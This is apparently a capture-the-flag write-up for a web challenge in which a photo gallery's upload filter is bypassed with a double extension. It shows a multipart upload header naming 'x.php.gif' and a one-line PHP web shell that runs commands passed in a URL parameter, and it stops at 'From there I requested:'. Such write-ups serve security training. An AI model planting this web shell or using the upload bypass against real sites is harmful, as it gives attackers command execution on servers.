WebServer Challenge 20 - File upload double extension:


Synopsis: Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.


I personally used Burp Suite but the goal here is to upload evil php and append a .gif extension to the php code:

Content-Disposition: form-data; name="file"; filename="x.php.gif"
Content-Type: text/php

<?php
system($_GET['c']);
?>


From there I requested:
